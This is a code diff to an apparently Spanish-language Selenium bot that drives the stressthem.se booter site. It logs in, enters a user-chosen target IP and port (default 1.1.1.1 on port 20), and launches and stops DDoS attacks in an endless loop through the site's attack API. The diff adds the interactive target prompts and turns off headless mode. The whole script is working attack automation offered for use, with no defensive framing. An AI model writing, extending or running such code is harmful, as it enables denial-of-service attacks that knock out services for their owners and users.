@@ -16,6 +16,7 @@ import json
 
 from pages import Pages
 from config import Config
+from rich.console import Console
 
 
 # TODO: hacer que saque estos datos de el config.json
@@ -59,14 +60,10 @@ logger.addHandler(handler)
 
 # TODO: que se pueda elegir diferente webdriver
 firefox_options = webdriver.FirefoxOptions()
-firefox_options.add_argument("--headless")
-
+#firefox_options.add_argument("--headless")
 
 service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")
-
 driver = webdriver.Firefox(service=service, options=firefox_options)
-
-
 
 class Main(Pages):
     def __init__(self, driver: webdriver.Chrome) -> None:
@@ -105,7 +102,6 @@ class Main(Pages):
             driver.add_cookie(cookie)
 
     def start_attack(self, ip: str, port: int, time: int, method: str):
-
         self.ip_form = self.driver.find_element(By.ID, "host")
         self.ip_form.send_keys(ip)
 
@@ -127,7 +123,6 @@ class Main(Pages):
             self.restart_session()
         except:
             pass
-
 
     def get_running_attacks(self, cookies: dict):
         s = requests.session()
@@ -152,36 +147,53 @@ class Main(Pages):
             url="https://www.stressthem.se/request/hub/running/attacks",
             headers=headers,
             cookies=cookies
-
         )
         if response.status_code == 200:
             return response.json()
         else:
             print(f"Error en la solicitud. Código de estado: {response.status_code}")
+
     def stop_attack(self, id: any):
         self.driver.execute_script("stopAttack();", id)
         time.sleep(0.2)
 
-
     def driver_quit(self) -> any:
         driver.quit()
 
+def get_user_input():
+    console = Console()
 
+    default_ip = "1.1.1.1"
+    default_port = 20
+
+    ip = console.input("Ingrese la dirección IP (por defecto: 1.1.1.1): ")
+    if ip == "":
+        ip = default_ip
+
+    port = console.input("Ingrese el puerto (por defecto: 20): ")
+    if port == "":
+        port = default_port
+    else:
+        port = int(port)
+
+    return ip, port
+
+ip, port = get_user_input()
 
 bot = Main(driver=driver)
 bot.login_form()
 bot.DDoS_page()
 bot.close_button()
+
 i = 1
 while True:
     i = i + 1
     try:
-        bot.start_attack(info["host"], info["port"], info["time"], info["method"])
+        bot.start_attack(ip, port, info["time"], info["method"])
         print(f"ejecución: {i}")
         time.sleep(info["time"])
         bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
     except Exception as e:
         print(f"Error en ejecución: {i}\n   Error: {e}")
     finally:
-        ...
-
+        pass
